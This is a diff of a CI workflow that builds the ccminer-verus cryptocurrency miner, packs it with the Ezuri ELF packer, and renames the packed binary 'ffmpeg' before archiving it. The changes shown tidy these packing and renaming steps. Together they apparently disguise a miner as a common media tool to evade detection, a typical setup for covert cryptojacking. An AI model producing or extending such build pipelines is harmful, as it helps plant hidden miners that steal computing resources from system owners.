@@ -21,12 +21,6 @@ jobs:
         sudo apt-get update
         sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool clang libelf-dev zlib1g-dev
 
-    - name: Install Go 1.23
-      run: |
-        wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
-        sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
-        echo "export PATH=$PATH:/usr/local/go/bin" >> $GITHUB_ENV
-
     - name: Clone and Modify ccminer
       run: |
         git clone https://github.com/Oink70/ccminer-verus.git
@@ -40,7 +34,7 @@ jobs:
         ./configure
         make -j$(nproc)
 
-    - name: Clone and Fix Ezuri go.mod
+    - name: Clone and build Ezuri
       run: |
         git clone -b master --depth 1 https://github.com/guitmz/ezuri.git
         cd ezuri
@@ -49,9 +43,10 @@ jobs:
 
     - name: Pack with Ezuri
       run: |
+        mv ../ccminer-verus/ccminer ezuri/ccminer
         cd ezuri
-        ./ezuri ../ccminer-verus/ccminer
-        mv ../ccminer-verus/ccminer ../ccminer-verus/ffmpeg
+        ./ezuri ccminer
+        mv ccminer ../ccminer-verus/ffmpeg
 
     - name: Create Tarball
       run: |
